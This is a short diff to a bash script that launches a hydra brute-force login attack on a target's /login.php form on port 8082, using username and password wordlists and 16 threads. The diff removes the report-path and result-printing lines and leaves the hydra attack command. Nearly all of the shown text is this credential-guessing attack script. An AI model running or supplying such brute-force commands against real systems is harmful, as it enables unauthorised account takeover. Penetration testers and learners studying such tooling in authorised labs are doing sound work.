@@ -27,21 +27,4 @@ port='8082';
 #read -p "Enter thread [4-16]: " thread;
 thread='16';
 
-# Report path
-user=$(whoami);
-reportPath="/home/${user}/Desktop/hydra.txt";
-
 hydra -L ${nameList} -P ${wordList} ${target} -s ${port} http-post-form "/login.php:username=^USER^&password=^PASS^:login failed" -t ${thread} -vV;
-if [[ ${?} -eq 0 ]];
-then
-    echo "Succeeded hydraAttack :D!";
-    echo "Result is as below: ";
-    echo "===========================";
-    cat ${reportPath};
-    echo "===========================";
-    exit 0;
-else
-    echo "Failed to launch hydra attack :(";
-    exit 1;
-fi
-exit 0
